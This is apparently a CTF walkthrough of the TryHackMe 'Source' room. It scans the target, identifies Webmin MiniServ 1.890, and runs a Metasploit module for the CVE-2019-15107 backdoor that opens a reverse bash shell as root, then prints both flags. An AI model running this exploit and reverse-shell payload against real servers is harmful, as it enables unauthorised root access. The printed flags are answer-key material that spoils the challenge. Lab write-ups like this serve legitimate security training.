| Category          | Details                                                                                       |
|-------------------|-----------------------------------------------------------------------------------------------|
| 📝 **Name**       | [Source](https://tryhackme.com/room/source)                                                   |  
| 🏷 **Type**       | THM Challenge                                                                                 |
| 🖥 **OS**         | Linux                                                                                         |
| 🎯 **Difficulty** | Easy                                                                                          |
| 📁 **Tags**       | MiniServ 1.890, [CVE-2019-15107](https://nvd.nist.gov/vuln/detail/CVE-2019-15107), Metasploit |

## Task 1: Embark

### user.txt

#### Scan target with `nmap`
```
┌──(magicrc㉿perun)-[~/attack/THM Source]
└─$ nmap -sS -sC -sV -p- $TARGET
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-27 06:36 +0100
Nmap scan report for 10.81.170.97
Host is up (0.046s latency).
Not shown: 65533 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b7:4c:d0:bd:e2:7b:1b:15:72:27:64:56:29:15:ea:23 (RSA)
|   256 b7:85:23:11:4f:44:fa:22:00:8e:40:77:5e:cf:28:7c (ECDSA)
|_  256 a9:fe:4b:82:bf:89:34:59:36:5b:ec:da:c2:d3:95:ce (ED25519)
10000/tcp open  http    MiniServ 1.890 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.40 seconds
```

#### Identify `MiniServ 1.890` running at port 10000
```
┌──(magicrc㉿perun)-[~/attack/THM Source]
└─$ curl -I https://$TARGET:10000 -k
HTTP/1.0 200 Document follows
Date: Tue, 27 Jan 2026 05:41:44 GMT
Server: MiniServ/1.890
Connection: close
Auth-type: auth-required=1
Set-Cookie: redirect=1; path=/
Set-Cookie: testing=1; path=/; secure
X-Frame-Options: SAMEORIGIN
Content-Security-Policy: script-src 'self' 'unsafe-inline' 'unsafe-eval'; frame-src 'self'; child-src 'self'
Content-type: text/html; Charset=UTF-8
```
This has been discovered by `nmap` as well. Since this server has command injection vulnerability ([CVE-2019-15107](https://nvd.nist.gov/vuln/detail/CVE-2019-15107)), we will use it as vector of attack.

#### Exploit [CVE-2019-15107](https://nvd.nist.gov/vuln/detail/CVE-2019-15107) with `linux/http/webmin_backdoor`
```
┌──(magicrc㉿perun)-[~/attack/THM Source]
└─$ msfconsole -q -x "
use linux/http/webmin_backdoor;
set RHOSTS $TARGET;
set SSL true;
set LHOST tun0;
set LPORT 4444;
set payload cmd/unix/reverse_bash;
run"
[*] Using configured payload cmd/unix/reverse_perl
RHOSTS => 10.81.170.97
[!] Changing the SSL option's value may require changing RPORT!
SSL => true
LHOST => tun0
LPORT => 4444
payload => cmd/unix/reverse_bash
[*] Started reverse TCP handler on 192.168.130.56:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Configuring Automatic (Unix In-Memory) target
[*] Sending cmd/unix/reverse_bash command payload
[*] Command shell session 1 opened (192.168.130.56:4444 -> 10.81.170.97:46500) at 2026-01-27 06:55:26 +0100

id
uid=0(root) gid=0(root) groups=0(root)
```

#### Capture user flag
```
cat /home/dark/user.txt
THM{SUPPLY_CHAIN_COMPROMISE}
```

### root.txt

#### Capture root flag
```
cat /root/root.txt
THM{UPDATE_YOUR_INSTALL}
```
